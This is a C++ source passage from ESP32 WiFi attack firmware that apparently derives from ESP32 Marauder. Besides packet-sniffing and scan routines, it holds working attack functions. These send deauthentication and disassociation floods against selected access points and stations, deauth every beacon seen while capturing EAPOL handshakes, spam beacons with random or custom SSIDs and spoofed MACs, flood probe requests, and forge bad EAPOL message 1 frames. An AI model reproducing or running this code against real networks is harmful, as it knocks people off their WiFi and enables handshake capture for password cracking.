void WiFiModules::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;
	}
	// Found beacon frame. Decide whether to deauth
	if (eapol_scan_send_deauth) {
		if (snifferPacket->payload[0] == 0x80) {    
		// Build packet
		uint8_t bssid[6];
		for (int i = 10; i < 16; i++) {
			bssid[i-10] = snifferPacket->payload[i];
		}
		memcpy(&wifi.deauth_frame_packet[10], bssid, 6);
		memcpy(&wifi.deauth_frame_packet[16], bssid, 6);
		
		memcpy(&wifi.disassoc_frame_packet[10], bssid, 6);     
		memcpy(&wifi.disassoc_frame_packet[16], bssid, 6);
		
		// Send packet
		esp_wifi_80211_tx(WIFI_IF_AP, wifi.deauth_frame_packet, sizeof(wifi.deauth_frame_packet), false);
		esp_wifi_80211_tx(WIFI_IF_AP, wifi.disassoc_frame_packet, sizeof(wifi.disassoc_frame_packet), false);
		delay(1);
		}
	}

	if (((snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){

		char addr[] = "00:00:00:00:00:00";
		getMAC(addr, snifferPacket->payload, 10);
		
		Serial.println("[INFO] Received EAPOL: " + String(addr));

		display_buffer->add(addr);
		wifiScanRedraw = true;
	}
}

void WiFiModules::analyzerWiFiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	for (int i = 0; i < 3; i++) wifi.wifi_analyzer_value++;
	if (wifi.wifi_analyzer_frames_recvd < 254) {
		wifi.wifi_analyzer_frames_recvd++;
	}
	if (wifi.wifi_analyzer_frames_recvd >= 100) { // Analyzer Name Refresh (ESP32 Marauder)
		if (type == WIFI_PKT_MGMT) {
			len -= 4;
			if (snifferPacket->payload[0] == 0x80) {
				String _temp_ssid = "";
				char addr[] = "00:00:00:00:00:00";
				getMAC(addr, snifferPacket->payload, 10);

				wifi.wifi_analyzer_rssi = snifferPacket->rx_ctrl.rssi;

				// Get ESSID if exists else give BSSID to display string
				if (snifferPacket->payload[37] <= 0) // There is no ESSID. Just add BSSID
					_temp_ssid = String(addr);
				else { // There is an ESSID. Add it
					for (int i = 0; i < snifferPacket->payload[37]; i++)
					{
						_temp_ssid.concat((char)snifferPacket->payload[i + 38]);
					}
				}
				wifi.wifi_analyzer_ssid = _temp_ssid;
			}
			wifi.wifi_analyzer_frames_recvd = 0;
		}
	}
}

void WiFiModules::StartAnalyzerScan() {

	Serial.println("[INFO] Starting Analyzer scan...");

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&analyzerWiFiSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartBeaconScan() {
	Serial.println("[INFO] Starting Beacon scan...");

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartProbeReqScan() {
	delete probe_req_ssids;
	probe_req_ssids = new LinkedList<ProbeReqSsid>();
	
	Serial.println("[INFO] Starting Probe Request scan...");

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartDeauthScan() {

	Serial.println("[INFO] Starting Deauthentication scan...");

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartEapolScan() {

	Serial.println("[INFO] Starting Eapol scan...");

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);

	esp_err_t err;
	wifi_config_t conf;
	err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
	if (err != 0)
	{
		Serial.print("[ERROR] Failed to set protocol | ErrorCode 0x");
		Serial.println(err, HEX);
	}

	esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
	conf.ap.ssid[0] = '\0';
	conf.ap.ssid_len = 0;
	conf.ap.channel = this->set_channel;
	conf.ap.ssid_hidden = 1;
	conf.ap.max_connection = 0;
	conf.ap.beacon_interval = 60000;

	err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
	if (err != 0)
	{
		Serial.print("[ERROR] Failed to set AP config, SSID might visible | ErrorCode: 0x");
		Serial.println(err, HEX);
	}

	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartAPStaWiFiScan() {
	delete access_points;
    access_points = new LinkedList<AccessPoint>();
	delete device_station;
	device_station = new LinkedList<Station>();

	Serial.println("[INFO] Starting WiFi/Station scan...");

	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&apstaSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
	vTaskDelay(100 / portTICK_PERIOD_MS);
}


void WiFiModules::StartAPWiFiScan() {
    delete access_points;
    access_points = new LinkedList<AccessPoint>();

    Serial.println("[INFO] Starting WiFi scan...");
    
	esp_netif_init();
  	esp_event_loop_create_default();

  	esp_wifi_init(&cfg2);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	wifi_initialized = true;
    vTaskDelay(100 / portTICK_PERIOD_MS);
}

void WiFiModules::StartAPWiFiScanOld() { // using old scan to scan wifi
	delete access_points;
    access_points = new LinkedList<AccessPoint>();

    Serial.println("[INFO] Starting WiFi scan (Old)...");
    
    WiFi.mode(WIFI_STA);
	wifi_initialized = true;
    vTaskDelay(100 / portTICK_PERIOD_MS);
    
    int numNetworks = WiFi.scanNetworks(false, true);
    
    if (numNetworks == -1) {
        Serial.println("[ERROR] WiFi scan failed or No network found!");
        return;
    }
    
    Serial.println("[INFO] WiFi Scan Done! Total: " + String(numNetworks) + " Found!");
    
    for (int i = 0; i < numNetworks; i++) {
        AccessPoint ap;
        ap.essid = WiFi.SSID(i);
        ap.channel = static_cast<uint8_t>(WiFi.channel(i));
        
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid != nullptr) {
            memcpy(ap.bssid, bssid, 6);
        } else {
            memset(ap.bssid, 0, 6);
        }

		if (ap.essid.isEmpty()) {
			ap.essid = macToString(ap.bssid);
		}

        wifi_auth_mode_t old_security_type = WiFi.encryptionType(i);
		uint8_t security_type = -1;
		switch (old_security_type) {
            case WIFI_AUTH_OPEN: security_type = WIFI_SECURITY_OPEN; break;
            case WIFI_AUTH_WEP: security_type = WIFI_SECURITY_WEP; break;
            case WIFI_AUTH_WPA_PSK: security_type = WIFI_SECURITY_WPA; break;
            case WIFI_AUTH_WPA2_PSK: security_type = WIFI_SECURITY_WPA2; break;
            case WIFI_AUTH_WPA_WPA2_PSK: security_type = WIFI_SECURITY_WPA_WPA2_MIXED; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: security_type = WIFI_SECURITY_WPA2_ENTERPRISE; break;
			case WIFI_AUTH_WPA3_PSK: security_type = WIFI_SECURITY_WPA3; break;
			case WIFI_AUTH_WAPI_PSK: security_type = WIFI_SECURITY_WAPI; break;
            default: security_type = -1; break;
        }
		ap.wpa = security_type;
		switch(security_type) {
			case WIFI_SECURITY_OPEN: ap.wpastr = "Open"; break;
			case WIFI_SECURITY_WEP: ap.wpastr = "WEP"; break;
			case WIFI_SECURITY_WPA: ap.wpastr = "WPA"; break;
			case WIFI_SECURITY_WPA2: ap.wpastr = "WPA2"; break;
			case WIFI_SECURITY_WPA2_ENTERPRISE: ap.wpastr = "WPA2/Enterprise"; break;
			case WIFI_SECURITY_WPA3: ap.wpastr = "WPA3"; break;
			case WIFI_SECURITY_WPA_WPA2_MIXED: ap.wpastr = "WPA/WPA2 Mixed"; break;
			case WIFI_SECURITY_WAPI: ap.wpastr = "WAPI"; break;
		}
        ap.selected = false;
        ap.rssi = static_cast<int8_t>(WiFi.RSSI(i));
        access_points->add(ap);
        
        Serial.println("[INFO] Added: " + ap.essid + " (Ch:" + String(ap.channel) + ")" + " (Enc:" + ap.wpastr + ")");
    }
    
    WiFi.scanDelete();
    
    Serial.println("[INFO] Scan completed successfully! Networks in list: " + String(access_points->size()));
}

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	channelRandom();
	vTaskDelay(1 / portTICK_PERIOD_MS);  

	// Randomize SRC MAC
	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);

	char ESSID[custom_ssid.essid.length() + 1] = {};
	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

	int realLen = strlen(ESSID);
	int ssidLen = random(realLen, 33);
	int numSpace = ssidLen - realLen;
	beacon_frame_packet[37] = ssidLen;

	// Insert my tag
	for(int i = 0; i < realLen; i++)
		beacon_frame_packet[38 + i] = ESSID[i];

	for(int i = 0; i < numSpace; i++)
		beacon_frame_packet[38 + realLen + i] = 0x20;

	/////////////////////////////
	
	beacon_frame_packet[50 + ssidLen] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };

	beacon_frame_packet[34] = custom_ssid.beacon[0];
	beacon_frame_packet[35] = custom_ssid.beacon[1];
	

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	channelRandom();

	// Randomize SRC MAC
	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);

	int ssidLen = strlen(ESSID);
	beacon_frame_packet[37] = ssidLen;

	// Insert my tag
	for(int i = 0; i < ssidLen; i++)
		beacon_frame_packet[38 + i] = ESSID[i];

	/////////////////////////////
	
	beacon_frame_packet[50 + ssidLen] = this->set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



	// Add everything that goes after the SSID
	for(int i = 0; i < 12; i++) 
		beacon_frame_packet[38 + ssidLen + i] = postSSID[i];
	

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendBeaconRandomSSID() {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	channelRandom();  

	// Randomize SRC MAC
	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);

	beacon_frame_packet[37] = 6;
	
	
	// Randomize SSID (Fixed size 6. Lazy right?)
	beacon_frame_packet[38] = alfa[random(65)];
	beacon_frame_packet[39] = alfa[random(65)];
	beacon_frame_packet[40] = alfa[random(65)];
	beacon_frame_packet[41] = alfa[random(65)];
	beacon_frame_packet[42] = alfa[random(65)];
	beacon_frame_packet[43] = alfa[random(65)];
	
	beacon_frame_packet[56] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



	// Add everything that goes after the SSID
	for(int i = 0; i < 12; i++) 
		beacon_frame_packet[38 + 6 + i] = postSSID[i];

	esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	
	packet_sent = packet_sent + 1;
    if (res != ESP_OK)
        packet_sent -= 1;
}

void WiFiModules::sendDeauthAttack() {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
		return;
	}

	for (int i = 0; i < access_points->size(); i++) {
		// Check if active
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1/ portTICK_PERIOD_MS);
			
			// Build packet
			
			memcpy(&deauth_frame_packet[10], access_points->get(i).bssid, 6);
			memcpy(&deauth_frame_packet[16], access_points->get(i).bssid, 6);

			memcpy(&disassoc_frame_packet[10], access_points->get(i).bssid, 6);
			memcpy(&disassoc_frame_packet[16], access_points->get(i).bssid, 6);    
		
			// Send packet
			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
		
			esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			packet_sent = packet_sent + 6;
		
			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
			if (res_4 != ESP_OK)
				packet_sent -= 1;
			if (res_5 != ESP_OK)
				packet_sent -= 1;
			if (res_6 != ESP_OK)
				packet_sent -= 1;
		}
	}
}

void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
		return;
	}

	this->set_channel = channel;
	changeChannel();
	delay(1);
	
	// Build AP source packet
	memcpy(&deauth_frame_packet[4], sta_mac, 6);
	memcpy(&deauth_frame_packet[10], bssid, 6);
	memcpy(&deauth_frame_packet[16], bssid, 6);

	memcpy(&disassoc_frame_packet[4], sta_mac, 6);
	memcpy(&disassoc_frame_packet[10], bssid, 6);
	memcpy(&disassoc_frame_packet[16], bssid, 6);
	// Send packet
	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	packet_sent = packet_sent + 6;

	if (res_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2 != ESP_OK)
		packet_sent -= 1;
	if (res_3 != ESP_OK)
		packet_sent -= 1;
	if (res_4 != ESP_OK)
		packet_sent -= 1;
	if (res_5 != ESP_OK)
		packet_sent -= 1;
	if (res_6 != ESP_OK)
		packet_sent -= 1;
  
	// Build AP dest packet
	memcpy(&deauth_frame_packet[4], bssid, 6);
	memcpy(&deauth_frame_packet[10], sta_mac, 6);
	memcpy(&deauth_frame_packet[16], sta_mac, 6);

	memcpy(&disassoc_frame_packet[4], bssid, 6);
	memcpy(&disassoc_frame_packet[10], sta_mac, 6);
	memcpy(&disassoc_frame_packet[16], sta_mac, 6);     
  
	// Send packet
	esp_err_t res_1_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_2_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_3_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

	esp_err_t res_4_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_5_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_6_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	packet_sent = packet_sent + 6;

	if (res_1_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2_1 != ESP_OK)
		packet_sent -= 1;
	if (res_3_1 != ESP_OK)
		packet_sent -= 1;
	if (res_4_1 != ESP_OK)
		packet_sent -= 1;
	if (res_5_1 != ESP_OK)
		packet_sent -= 1;
	if (res_6_1 != ESP_OK)
		packet_sent -= 1;
  }

void WiFiModules::sendProbeAttack() {
	for (int i = 0; i <access_points->size(); i++) {
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1 / portTICK_PERIOD_MS);
      
			// Build packet
			// Randomize SRC MAC
			
			probe_frame_packet[10] = random(256);
			probe_frame_packet[11] = random(256);
			probe_frame_packet[12] = random(256);
			probe_frame_packet[13] = random(256);
			probe_frame_packet[14] = random(256);
			probe_frame_packet[15] = random(256);

			// Set SSID length
			int ssidLen = access_points->get(i).essid.length();

			probe_frame_packet[25] = ssidLen;

			// Insert ESSID
			char buf[ssidLen + 1] = {};
			access_points->get(i).essid.toCharArray(buf, ssidLen + 1);
			
			for(int i = 0; i < ssidLen; i++)
				probe_frame_packet[26 + i] = buf[i];
				
			uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
									0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
									0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
									0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00};

			uint8_t good_probe_req_packet[26 + ssidLen + 40] = {};
			
			for (int i = 0; i < 26 + ssidLen; i++)
				good_probe_req_packet[i] = probe_frame_packet[i];

			for(int i = 0; i < 40; i++) 
				good_probe_req_packet[26 + ssidLen + i] = postSSID[i];
			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

			packet_sent = packet_sent + 3;

			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
		}
	}
}

void WiFiModules::sendEapolBagMsg(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
	this->set_channel = channel;
	changeChannel();
	vTaskDelay(1 / portTICK_PERIOD_MS);
  
	// Build packet
	eapol_packet_bad_msg1[4] = mac[0];
	eapol_packet_bad_msg1[5] = mac[1];
	eapol_packet_bad_msg1[6] = mac[2];
  
	eapol_packet_bad_msg1[7] = mac[3];
	eapol_packet_bad_msg1[8] = mac[4];
	eapol_packet_bad_msg1[9] = mac[5];
  
	eapol_packet_bad_msg1[10] = bssid[0];
	eapol_packet_bad_msg1[11] = bssid[1];
	eapol_packet_bad_msg1[12] = bssid[2];
	eapol_packet_bad_msg1[13] = bssid[3];
	eapol_packet_bad_msg1[14] = bssid[4];
	eapol_packet_bad_msg1[15] = bssid[5];
  
	eapol_packet_bad_msg1[16] = bssid[0];
	eapol_packet_bad_msg1[17] = bssid[1];
	eapol_packet_bad_msg1[18] = bssid[2];
	eapol_packet_bad_msg1[19] = bssid[3];
	eapol_packet_bad_msg1[20] = bssid[4];
	eapol_packet_bad_msg1[21] = bssid[5]; 
  
	/* Generate random Nonce */
	for (uint8_t i = 0; i < 32; i++) {
	  eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
	}
	/* Update replay counter */
	for (uint8_t i = 0; i < 8; i++) {
	  eapol_packet_bad_msg1[41 + i] = (packet_sent >> (56 - i * 8)) & 0xFF;
	}
  
	if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
	  eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
	  eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
	  eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
	}
	else {
	  eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
	  eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
	  eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
	}
  
	// Send packet
	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);

	packet_sent = packet_sent + 3;

	if (res_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2 != ESP_OK)
		packet_sent -= 1;
	if (res_3 != ESP_OK)
		packet_sent -= 1;
  }